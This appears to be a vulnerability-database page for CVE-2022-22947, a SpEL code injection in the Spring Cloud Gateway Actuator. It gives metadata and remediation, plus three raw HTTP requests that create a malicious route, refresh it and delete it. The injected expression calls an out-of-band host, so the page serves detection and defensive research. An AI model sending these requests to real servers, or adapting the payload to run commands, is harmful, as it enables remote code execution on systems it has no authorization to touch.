---
layout: post
cve_id: CVE-2022-22947
title: Spring Cloud Gateway Code Injection
pcap: true
pcap_path: /pcaps/2022/CVE-2022-22947.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-22947.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: critical
impact: 'Successful exploitation of this vulnerability could lead to remote code execution,
  compromising the confidentiality, integrity, and availability of the affected system.

  '
remediation: 'Apply the latest security patches provided by the vendor and ensure
  proper input validation to prevent code injection attacks.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2022-22947
- https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/
- https://github.com/wdahlenburg/spring-gateway-demo
- https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published
- https://tanzu.vmware.com/security/cve-2022-22947
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10
  cve-id: CVE-2022-22947
  cwe-id: CWE-917,CWE-94
  epss-score: 0.94461
  epss-percentile: 0.99994
  cpe: cpe:2.3:a:vmware:spring_cloud_gateway:*:*:*:*:*:*:*:*
metadata:
  max-request: 3
  vendor: vmware
  product: spring_cloud_gateway
tags:
- cve
- cve2022
- apache
- spring
- vmware
- actuator
- oast
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
Applications using Spring Cloud Gateway prior to 3.1.1+ and 3.0.7+ are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.

## üåê HTTP Request
```nohighlight
POST /actuator/gateway/routes/38BgOyKoYoBpcyCcgE2yd6iMhF2 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.9
Connection: close
Content-Length: 412
Content-Type: application/json
Accept-Encoding: gzip
{
"predicates": [
{
"name": "Path",
"args": {
"_genkey_0": "/38BgOyKoYoBpcyCcgE2yd6iMhF2/**"
}
}
],
"filters": [
{
"name": "RewritePath",
"args": {
"_genkey_0": "#{T(java.net.InetAddress).getByName(\"d5isij9le0o3fu6nfgu0fukpcdqqt8m56.oast.pro\")}",
"_genkey_1": "/${path}"
}
}
],
"uri": "/",
"order": 0
}
```

```nohighlight
POST /actuator/gateway/refresh HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15
Connection: close
Content-Length: 316
Content-Type: application/json
Accept-Encoding: gzip
{
"predicate": "Paths: [/38BgOyKoYoBpcyCcgE2yd6iMhF2], match trailing slash: true",
"route_id": "38BgOyKoYoBpcyCcgE2yd6iMhF2",
"filters": [
"[[RewritePath #{T(java.net.InetAddress).getByName(\"d5isij9le0o3fu6nfgu0jewsdkwqmeunk.oast.pro\")} = /${path}], order = 1]"
],
"uri": "/",
"order": 0
}
```

```nohighlight
DELETE /actuator/gateway/routes/38BgOyKoYoBpcyCcgE2yd6iMhF2 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) ConnectPC Safari/537.36 Browser
Connection: close
Accept-Encoding: gzip
```

